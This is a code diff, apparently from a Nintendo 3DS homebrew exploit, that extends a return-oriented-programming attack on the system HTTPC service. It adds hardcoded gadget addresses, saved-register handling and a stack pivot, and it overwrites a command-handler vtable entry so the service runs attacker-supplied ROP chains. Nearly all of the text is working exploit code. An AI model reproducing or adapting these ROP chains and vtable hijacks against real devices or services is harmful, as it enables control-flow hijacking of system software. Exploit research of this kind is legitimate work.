@@ -71,6 +71,8 @@ u32 ROP_HTTPC_CMDHANDLER_AddPostDataAscii = 0x00114fc0;//Same as ROP_HTTPC_CMDHA
 
 u32 ROP_HTTPC_CMDHANDLER_RETURN = 0x00114bf4;//Code to jump to in httpc_cmdhandler for returning from that function.
 
+u32 ROP_HTTPC_CMDHANDLER_FUNCRETURNADDR_MAINTHREAD = 0x0010eb9c;//Saved LR for httpc_cmdhandler when called from the main thread.
+
 u32 ROP_sharedmem_create = 0x001045a4;
 
 u32 ROP_http_context_getctxptr = 0x0010b8d8;//inr0=_this inr1=contexthandle
@@ -886,6 +888,8 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 curent = ropheap+0x3c;
 	u32 ropentry_type = ropheap+0x44;
 
+	u32 customcmdhandler_roplaunch_savedregs_addr=0;
+
 	if(first_targeturlctx==NULL)
 	{
 		printf("setuphaxx_httpheap_sharedmem(): The input list is empty.\n");
@@ -943,7 +947,8 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_handlerfunc_stackframe+0x7c, ropheap+0x0, 0x3);//Copy the cmdbuf ptr from stack to ropheap+0x0.
 	ropgen_copyu32(&ropchain, &ropvaddr, ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR+4, ropheap+0x8, 0x3);//Save/restore the word overwritten by the ROP_PUSHR42IPLR_CMPR0_RETURN gadget.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, 0x08000004, 1);//Load the zero from 0x08000004 into r0, since the ROP_PUSHR42IPLR_CMPR0_RETURN gadget requires it.
-	ropgen_blxr3(&ropchain, &ropvaddr, ROP_PUSHR42IPLR_CMPR0_RETURN, 1);//Save r4-ip and lr on stack.
+	customcmdhandler_roplaunch_savedregs_addr = ropvaddr+0xc-0x28;
+	ropgen_blxr3(&ropchain, &ropvaddr, ROP_PUSHR42IPLR_CMPR0_RETURN, 1);//Save r4-ip and lr on stack @ customcmdhandler_roplaunch_savedregs_addr.
 	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x8, ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR+4, 0x3);
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x1, ropentry_type, 1);//Write 0x1 to ropentry_type.
 
@@ -971,7 +976,8 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropchain = (u32*)&ropvmem_sharedmem[bakropoff>>2];
 	ropvaddr = ropvmem_base+ropoffset;
 
-	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base, roplaunch_bakaddr, roplaunch_baksize);//Restore the initial CreateContext ROP using the backup.
+	ropgen_memcpy(&ropchain, &ropvaddr, ropheap+0x48, customcmdhandler_roplaunch_savedregs_addr, 0x24);//Don't copy the LR at the end since it won't have the original anyway.
+	ropgen_memcpy(&ropchain, &ropvaddr, ropvmem_base, roplaunch_bakaddr, roplaunch_baksize);//Restore the initial ROP from above using the backup.
 
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x4, 1);//r0 = _this
 	ropgen_add_r0ip(&ropchain, &ropvaddr, 0x10);//r0+= 0x10.
@@ -1264,6 +1270,25 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropentry_type, 1);//Write 0x0 to ropentry_type.
 
+	//Setup the default cmdreply data, for invalid cmdid.
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x00000040;
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_writeu32(&ropchain, &ropvaddr, 0x00000040, 0, 0);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[1] = 0xd900182f;
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_writeu32(&ropchain, &ropvaddr, 0xd900182f, 0, 0);
+
+	//Setup the ROP used for returning to the actual cmdhandler thread code.
+	ropgen_writeu32(&ropchain, &ropvaddr, ROP_POP_R4R5R6R7R8R9SLFPIPPC, __httpmainthread_handlerfunc_stackframe-0x28-4, 1);//When doing the stack-pivot, it will jump to ROP_POP_R4R5R6R7R8R9SLFPIPPC for pc with this.
+
+	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_FUNCRETURNADDR_MAINTHREAD, __httpmainthread_handlerfunc_stackframe-4, 1);//Write the pc addr for the above reg pop.
+
+	ropgen_memcpy(&ropchain, &ropvaddr, __httpmainthread_handlerfunc_stackframe-0x28, ropheap+0x48, 0x24);//Copy the saved regs to the stack data used with the above.
+
+	ropgen_stackpivot(&ropchain, &ropvaddr, __httpmainthread_handlerfunc_stackframe-0x28-4);//Pivot to the ret2thread ROP setup above.
+
 	ropgen_addword(&ropchain, &ropvaddr, 0x55555554);
 
 	if(ropvaddr-ropvmem_base > bakropoff)
@@ -1293,7 +1318,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ptr = custom_cmdhandlervtable_sharedmemptr;
 	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CMDHANDLEROBJ_VTABLE - 0x100000], ROP_HTTPC_CMDHANDLEROBJ_VTABLE_SIZE);
 	ptr[0x8>>2] = ROP_STACKPIVOT-4;//vtable funcptr for the actual httpc_cmdhandler function.
-	ptr[0xc>>2] = ROP_MVNR0VAL0_BXLR;//This vtable funcptr is used for checking what thread to handle the command with. Adjust the address so that it always returns ~0(-1) for handling the command with the current(main) thread.
+	ptr[0xc>>2] = ROP_MVNR0VAL0_BXLR;//This vtable funcptr is used for checking what thread to handle the command with. Adjust the address so that it always returns ~0(-1) for handling the command with the current(main) thread. For whatever reason this seems to be ignored(?): the custom cmdhandler apparently doesn't run with any commands which wouldn't have been processed with the main-thread + the original vtable funcptr.
 
 	//Setup the custom vtables for context-sessions.
 	cur_targeturlctx = first_targeturlctx;
